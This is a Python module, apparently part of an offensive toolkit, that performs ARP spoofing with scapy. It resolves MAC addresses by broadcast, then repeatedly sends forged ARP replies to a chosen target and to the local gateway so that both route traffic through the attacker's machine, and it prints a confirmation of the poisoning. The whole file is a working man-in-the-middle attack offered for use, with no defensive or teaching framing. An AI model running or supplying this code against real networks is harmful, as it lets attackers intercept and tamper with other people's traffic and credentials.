from functools import cache
from time import sleep

from colorama import Fore as F
from getmac import get_mac_address as __get_host_mac
from scapy.all import send, srp
from scapy.layers.l2 import ARP, Ether

from tools.addons.ip_tools import __get_local_host_ips


@cache
def __get_mac(target: str) -> str:
    """Get the MAC address of the target.

    Args:
        - target - The target that we want to get the MAC address

    Returns:
        - mac_addr - The MAC address itself
    """
    while True:
        try:
            arp_request = ARP(pdst=target)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request
            ans = srp(packet, timeout=5, verbose=False)[0]
            mac_addr = ans[0][1].hwsrc
        except IndexError:
            continue
        else:
            return mac_addr


GATEWAY_IP = __get_local_host_ips()[0]


def flood(target: str) -> None:
    """Start sending modified ARP requests to the target and the gateway.

    Args:
        - target - The target that will have its ARP table modified

    Returns:
        None
    """
    packet = ARP(op=2, pdst=target, hwdst=__get_mac(target), psrc=GATEWAY_IP)
    send(packet, verbose=False)

    packet = ARP(op=2, pdst=GATEWAY_IP, hwdst=__get_mac(GATEWAY_IP), psrc=target)
    send(packet, verbose=False)

    print(
        f"{F.GREEN}{target}{F.RESET} now thinks that {F.BLUE}{__get_mac(GATEWAY_IP)}{F.RESET}"
        f" (Gateway's MAC Address) is {F.BLUE}{__get_host_mac()}{F.RESET} (Your Mac Address){F.RESET}\r",
        end="",
    )
    sleep(2)
